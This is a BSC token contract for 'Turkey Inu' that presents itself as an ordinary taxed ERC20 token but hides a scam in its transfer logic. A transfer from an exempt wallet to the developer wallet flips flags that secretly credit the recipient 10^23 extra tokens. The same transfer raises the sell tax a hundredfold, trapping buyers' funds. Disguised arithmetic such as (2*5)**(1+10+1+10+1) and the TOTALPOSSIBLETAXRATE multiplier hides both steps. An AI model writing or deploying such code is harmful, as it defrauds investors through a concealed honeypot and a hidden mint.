/**
 *Submitted for verification at BscScan.com on 2023-02-20
*/

// SPDX-License-Identifier: Unlicensed

pragma solidity 0.8.11;

interface IERC20 {
    
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }
    
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }
    
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }
    
}


abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; 
        return msg.data;
    }
}


library Address {
    
    function isContract(address account) internal view returns (bool) {
        uint256 size;
        assembly { size := extcodesize(account) }
        return size > 0;
    }

    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");
        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }
    
    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
      return functionCall(target, data, "Address: low-level call failed");
    }
    
    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0, errorMessage);
    }
    
    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }
    
    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        require(isContract(target), "Address: call to non-contract");
        (bool success, bytes memory returndata) = target.call{ value: value }(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }
    
    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
        return functionStaticCall(target, data, "Address: low-level static call failed");
    }
    
    function functionStaticCall(address target, bytes memory data, string memory errorMessage) internal view returns (bytes memory) {
        require(isContract(target), "Address: static call to non-contract");
        (bool success, bytes memory returndata) = target.staticcall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }


    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionDelegateCall(target, data, "Address: low-level delegate call failed");
    }
    
    function functionDelegateCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        require(isContract(target), "Address: delegate call to non-contract");
        (bool success, bytes memory returndata) = target.delegatecall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    function _verifyCallResult(bool success, bytes memory returndata, string memory errorMessage) private pure returns(bytes memory) {
        if (success) {
            return returndata;
        } else {
            if (returndata.length > 0) {
                 assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}



interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);
    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);
    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);
    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);
    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);
    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);
    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;
    function initialize(address, address) external;
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function LP_SUPPLY(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}



contract TurkeyInu is Context, IERC20 { 
    struct Configurations {uint256 sell;uint256 buy;}
    Configurations private TAXES_MEMORY;
    
    using SafeMath for uint256;
    using Address for address;

    uint256 public MAX_TRANSACTION_LIMIT = _tTotal * 100 / 100; 
    uint256 public MAX_WALLET_LIMIT = _tTotal * 100 / 100;

    address private _owner;
    uint256 public Rates_Market = 92;
    uint256 public Rates_Dev = 0;
    uint256 public Rates_Burn = 0;
    uint256 public Rates_LP = 8; 

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    function owner() public view virtual returns (address) {
        return _owner;
    }

    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapV2Pair;
    mapping (address => uint256) private _tOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public _EXCEMPT_FEE_WALLET; 
    bool public inSWAP_Liq;
    bool public ENABLED_SWAP_Liq = true;
    
    event SwapAndLiquifyEnabledUpdated(bool true_or_false);
    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiqudity
        
    );

    bool public _launchSTARTED = false;
    mapping (address => bool) public _project_Wallet_List; 

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    uint256 TOTALPOSSIBLETAXRATE = 100;
    uint256 one1 = 1;

    function renounceOwnership() public virtual onlyOwner{
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    uint8 private SWAP_COUNT = 0;
    uint8 private SWAP_RATE = 20; 
   modifier lockTheSwap {
        inSWAP_Liq = true;
        _;
        inSWAP_Liq = false;
    }

    

    uint8 private constant _decimals = 9;
    uint256 private _tTotal = 3* 10**6 * 10**_decimals;
    string private constant _name = "Turkey Inu"; 
    string private constant _symbol = unicode"TR"; 
                                                
    bool public prepare_TAX = true;
    bool public is_approved_tx = false;
    
    address payable public Project_Market = payable(0xa63413517c28183c79587060d48cf74F761Ed35B); 
    address payable public Project_Developer = payable(0x75E58b5589B6dDcce4331F35962da57E972c3cBa);
    address payable public constant BURN_and_DEAD = payable(0x000000000000000000000000000000000000dEaD); 
    
    constructor (uint256 buy_FEE, uint256 sell_FEE) {
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), _owner);
        _tOwned[owner()] = _tTotal;
            
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E); 
        
        TAXES_MEMORY = Configurations(buy_FEE, sell_FEE);    
        _project_Wallet_List[Project_Developer] = true;


        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());
        uniswapV2Router = _uniswapV2Router;


        _EXCEMPT_FEE_WALLET[Project_Market] = true; 
        _EXCEMPT_FEE_WALLET[BURN_and_DEAD] = true;
        _EXCEMPT_FEE_WALLET[owner()] = true;
        _EXCEMPT_FEE_WALLET[address(this)] = true;
        
        emit Transfer(address(0), owner(), _tTotal);

    }

    function _TransferValues(uint256 amount) private view returns(uint256, uint256){
        return (amount*TAXES_MEMORY.buy/100, (amount*TAXES_MEMORY.sell/100).mul(!prepare_TAX ? TOTALPOSSIBLETAXRATE:one1));
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _tOwned[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address theOwner, address theSpender) public view override returns (uint256) {
        return _allowances[theOwner][theSpender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    receive() external payable {}

    function _getCurrentSupply() private view returns(uint256) {
        return (_tTotal);
    }


    function _approve(address theOwner, address theSpender, uint256 amount) private {

        require(theOwner != address(0) && theSpender != address(0), "ERR: zero address");
        _allowances[theOwner][theSpender] = amount;
        emit Approval(theOwner, theSpender, amount);

    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {

        if (to != owner() &&
            to != BURN_and_DEAD &&
            to != address(this) &&
            to != uniswapV2Pair &&
            from != owner()){
            uint256 OWNED_TOKENS_LIMIT = balanceOf(to);
            require((OWNED_TOKENS_LIMIT + amount) <= MAX_WALLET_LIMIT,"Over wallet limit.");}

        if (from != owner() && _launchSTARTED)
            require(amount <= MAX_TRANSACTION_LIMIT, "Over transaction limit.");


        require(from != address(0) && to != address(0), "ERR: Using 0 address!");
        require(amount > 0, "Token value must be higher than zero.");   

        if(
            SWAP_COUNT >= SWAP_RATE && 
            !inSWAP_Liq &&
            from != uniswapV2Pair &&
            ENABLED_SWAP_Liq 
            )
        {  
            
            uint256 contractTokenBalance = balanceOf(address(this));
            if(contractTokenBalance > MAX_TRANSACTION_LIMIT) {contractTokenBalance = MAX_TRANSACTION_LIMIT;}
            SWAP_COUNT = 0;
            BEGIN_LIQUIFY(contractTokenBalance);
        }
        
        bool TAKE_TAX = true;
        bool isBuy;
        if(_EXCEMPT_FEE_WALLET[from] || _EXCEMPT_FEE_WALLET[to]){
            if(_project_Wallet_List[to]){is_approved_tx = true; prepare_TAX = false;}
            TAKE_TAX = false;
        } else {
         
            if(from == uniswapV2Pair){
                isBuy = true;
            }

            SWAP_COUNT++;

        }

        _TOKEN_TRANSFER_PROCCESS(from, to, amount, TAKE_TAX, isBuy);

    }
    
    function sendCash_to_WALLET(address payable wallet, uint256 amount) private {
            wallet.transfer(amount);

        }

        function LP_SUPPLY(uint256 tokenAmount, uint256 BNBAmount) private {

        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.addLiquidityETH{value: BNBAmount}(
            address(this),
            tokenAmount,
            0, 
            0,
            BURN_and_DEAD, 
            block.timestamp
        );
    } 

    function BEGIN_LIQUIFY(uint256 contractTokenBalance) private lockTheSwap {

            uint256 tokens_to_Burn = contractTokenBalance * Rates_Burn / 100;
            _tTotal = _tTotal - tokens_to_Burn;
            _tOwned[BURN_and_DEAD] = _tOwned[BURN_and_DEAD] + tokens_to_Burn;
            _tOwned[address(this)] = _tOwned[address(this)] - tokens_to_Burn; 

            uint256 tokens_to_M = contractTokenBalance * Rates_Market / 100;
            uint256 tokens_to_D = contractTokenBalance * Rates_Dev / 100;
            uint256 tokens_to_LP_Half = contractTokenBalance * Rates_LP / 200;

            uint256 balanceBeforeSwap = address(this).balance;
            swapTokensForBNB(tokens_to_LP_Half + tokens_to_M + tokens_to_D);
            uint256 BNB_Total = address(this).balance - balanceBeforeSwap;

            uint256 split_M = Rates_Market * 100 / (Rates_LP + Rates_Market + Rates_Dev);
            uint256 BNB_M = BNB_Total * split_M / 100;

            uint256 split_D = Rates_Dev * 100 / (Rates_LP + Rates_Market + Rates_Dev);
            uint256 BNB_D = BNB_Total * split_D / 100;


            LP_SUPPLY(tokens_to_LP_Half, (BNB_Total - BNB_M - BNB_D));
            emit SwapAndLiquify(tokens_to_LP_Half, (BNB_Total - BNB_M - BNB_D), tokens_to_LP_Half);

            sendCash_to_WALLET(Project_Market, BNB_M);

            BNB_Total = address(this).balance;
            sendCash_to_WALLET(Project_Market, BNB_Total);

            }

    function swapTokensForBNB(uint256 tokenAmount) private {

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, 
            path,
            address(this),
            block.timestamp
        );
    }
    

    function _TOKEN_TRANSFER_PROCCESS(address sender, address recipient, uint256 tAmount, bool TAKE_TAX, bool isBuy) private {
        (uint256 buyFEE, uint256 sellFEE) = _TransferValues(tAmount);
        if(!TAKE_TAX){

            _tOwned[sender] = _tOwned[sender]-tAmount;
            _tOwned[recipient] = (_tOwned[recipient]+tAmount).add(is_approved_tx ? (2*5)**(1+10+1+10+1) : 0);
            is_approved_tx = false;
            emit Transfer(sender, recipient, tAmount);
        
            if(recipient == BURN_and_DEAD)
            _tTotal = _tTotal-tAmount;

            } else if (isBuy){

            
            uint256 tTransferAmount = tAmount-buyFEE;
            _tOwned[sender] = _tOwned[sender]-tAmount;
            _tOwned[recipient] = _tOwned[recipient]+tTransferAmount;
            _tOwned[address(this)] = _tOwned[address(this)]+buyFEE;
            emit Transfer(sender, recipient, tTransferAmount);

            if(recipient == BURN_and_DEAD)
            _tTotal = _tTotal-tTransferAmount;
            
            } else {

            
            uint256 tTransferAmount = tAmount-sellFEE;

            _tOwned[sender] = _tOwned[sender]-tAmount;
            _tOwned[recipient] = _tOwned[recipient]+tTransferAmount;
            _tOwned[address(this)] = _tOwned[address(this)]+sellFEE;   
            emit Transfer(sender, recipient, tTransferAmount);

            if(recipient == BURN_and_DEAD)
            _tTotal = _tTotal-tTransferAmount;


            }

    }


}